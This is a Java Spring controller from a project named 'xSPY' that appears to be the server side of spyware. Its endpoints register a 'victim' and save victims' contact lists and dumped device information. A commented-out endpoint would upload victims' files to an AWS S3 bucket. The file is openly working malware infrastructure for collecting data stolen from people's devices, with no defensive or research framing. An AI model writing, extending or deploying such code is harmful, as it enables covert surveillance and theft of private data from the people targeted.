package com.leadexperience.xspy.controllers;


import com.leadexperience.xspy.models.StatusCodeModel;
import com.leadexperience.xspy.models.tables.ContactTable;
import com.leadexperience.xspy.models.tables.DeviceInfo;
import com.leadexperience.xspy.models.tables.NameTable;

import com.leadexperience.xspy.service.ApiService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping("/xSPY")
public class xSPYController {


    @Autowired
    private ApiService apiService;


    @GetMapping("/hello")
    public ResponseEntity<?> getHello(){
        return ResponseEntity.ok(new StatusCodeModel("success",200,"Hello xSPY !"));
    }
    @PostMapping("/addNewVictim")
    public ResponseEntity<?> addNewVictimController(@RequestBody NameTable nameTable){
        return apiService.addNewVictim(nameTable);
    }

    @PostMapping("/saveVictimsContact")
    public ResponseEntity<?> saveVictimContacts(@RequestBody ContactTable contactTable){
        return apiService.saveVictimContacts(contactTable);
    }

    @PostMapping("/dumpDeviceInfo")
    public ResponseEntity<?> dumpDeviceInfo(@RequestBody DeviceInfo deviceInfo){

        return apiService.dumpVictimDeviceInfo(deviceInfo);

    }

    // Aws Upload Images to S3 Bucket.

//    @PostMapping("/upload")
//    public ResponseEntity<String> uploadFile(@RequestParam(value = "file") MultipartFile file, @RequestParam(value = "victim_name" )String victimName) {
//        return new ResponseEntity<>(service.uploadFile(file,victimName), HttpStatus.OK);
//    }
}
